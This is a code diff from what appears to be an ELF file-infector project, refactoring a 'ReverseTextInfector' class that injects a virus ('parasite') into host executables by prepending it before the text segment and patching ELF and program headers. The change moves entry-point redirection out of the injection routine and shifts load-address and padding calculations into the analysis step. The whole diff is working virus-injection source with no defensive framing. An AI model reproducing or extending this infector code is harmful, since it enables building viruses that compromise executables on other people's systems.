@@ -2,8 +2,6 @@
 #include <elf.h>
 #include "common/file_descriptor.hh"
 #include "common/math.hh"
-#include "common/patch_pattern.hh"
-#include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
 #include "nostdlib/string.hh"
 
@@ -93,15 +91,6 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
 void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
                 Elf64_Off original_code_segment_file_offset,
                 uint64_t padded_virus_size) {
-  ehdr.e_entry = original_code_segment_p_vaddr - padded_virus_size;
-  // virus inserted after ehdr.
-  if (original_code_segment_file_offset == 0) {
-    // Because we need to accomodate the elf header, the virus has padding
-    // before it. The real entry is one page after the originally planned vaddr
-    // in order to make the virus page aligned and rodata relocation safe.
-    ehdr.e_entry += 4096;
-  }
-
   // section header always comes after the virus.
   ehdr.e_shoff += padded_virus_size;
 
@@ -213,8 +202,9 @@ size_t inject_virus(std::span<std::byte> host_mapping,
 
 }  // namespace
 
-bool ReverseTextInfector::inject(std::span<std::byte> host_mapping,
-                                 std::span<const std::byte> parasite_mapping) {
+std::optional<InjectionResult> ReverseTextInfector::inject(
+    std::span<std::byte> host_mapping,
+    std::span<const std::byte> parasite_mapping) {
   const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
   {
@@ -253,10 +243,11 @@ bool ReverseTextInfector::inject(std::span<std::byte> host_mapping,
   auto virus_real_start_offset =
       inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size_,
                    original_code_segment_file_offset_);
-  // Patch parasite to resume host code after execution.
-  return common::redirect_elf_entry_point(
-      original_e_entry_, ehdr.e_entry, virus_real_start_offset,
-      parasite_mapping.size(), host_mapping);
+
+  return InjectionResult{
+      .parasite_entry_address = parasite_load_address_,
+      .parasite_file_offset = virus_real_start_offset,
+  };
 }
 
 bool ReverseTextInfector::analyze(std::span<const std::byte> host_mapping,
@@ -285,6 +276,20 @@ bool ReverseTextInfector::analyze(std::span<const std::byte> host_mapping,
       code_segment_idx_ = i;
       original_code_segment_p_vaddr_ = phdr_entry->p_vaddr;
       original_code_segment_file_offset_ = phdr_entry->p_offset;
+
+      auto extra_padding = original_code_segment_file_offset_ == 0 ? 4096 : 0;
+      padded_virus_size_ =
+          common::round_up_to(padded_virus_size_, 4096) + extra_padding;
+
+      parasite_load_address_ =
+          original_code_segment_p_vaddr_ - padded_virus_size_;
+      if (original_code_segment_file_offset_ == 0) {
+        // Because we need to accomodate the elf header, the virus has padding
+        // before it. The real entry is one page after the originally planned
+        // vaddr in order to make the virus page aligned and rodata relocation
+        // safe.
+        parasite_load_address_ += 4096;
+      }
       return true;
     }
   }
@@ -293,9 +298,6 @@ bool ReverseTextInfector::analyze(std::span<const std::byte> host_mapping,
 }
 
 size_t ReverseTextInfector::injected_host_size() {
-  auto extra_padding = original_code_segment_file_offset_ == 0 ? 4096 : 0;
-  padded_virus_size_ =
-      common::round_up_to(padded_virus_size_, 4096) + extra_padding;
   // See comments in header.
   return host_size_ + padded_virus_size_;
 }
